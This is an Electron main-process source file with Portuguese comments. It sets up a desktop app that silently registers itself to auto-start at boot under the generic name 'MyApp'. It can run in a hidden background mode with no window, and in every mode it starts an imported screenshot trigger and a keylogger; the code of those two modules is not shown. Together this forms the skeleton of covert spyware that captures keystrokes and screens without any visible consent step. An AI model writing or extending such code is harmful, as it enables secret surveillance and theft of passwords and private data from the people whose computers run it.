import { app, BrowserWindow } from 'electron';
import path from 'path';
import { fileURLToPath } from 'url';
import AutoLaunch from 'auto-launch';
import { setupScreenshotTrigger } from './printscreen.js';
import { keyboardListenerSetup } from './key-logger.js';

// Variável para armazenar a janela principal
let mainWindow;

// Obter o diretório do arquivo atual
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Configuração do auto-launch para iniciar o app ao ligar o sistema
const appAutoLauncher = new AutoLaunch({
  name: 'MyApp',
  path: app.getPath('exe'),
});

// Verifica se o auto-launch está ativado, se não, ativa
appAutoLauncher.isEnabled()
  .then((isEnabled) => {
    if (!isEnabled) {
      appAutoLauncher.enable();
    }
  })
  .catch((err) => {
    console.error('Erro ao verificar ou habilitar o auto-launch:', err);
  });

// Função para criar a janela principal do app
function createWindow() {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: true,
    },
  });

  mainWindow.loadURL('http://localhost:3000/home');

  if (process.env.NODE_ENV === 'development') {
    mainWindow.webContents.openDevTools();
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

// Inicializa o Electron
app.whenReady().then(() => {
  const isBackground = process.argv.includes('--background'); // Verifica se foi passado o argumento para rodar em segundo plano

  if (!isBackground) {
    createWindow(); // Cria a janela apenas se não estiver rodando em segundo plano
  }

  setupScreenshotTrigger();  // Continua rodando as funções principais mesmo em segundo plano
  keyboardListenerSetup();   // Configura o keylogger mesmo em segundo plano

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0 && !isBackground) {
      createWindow();
    }
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
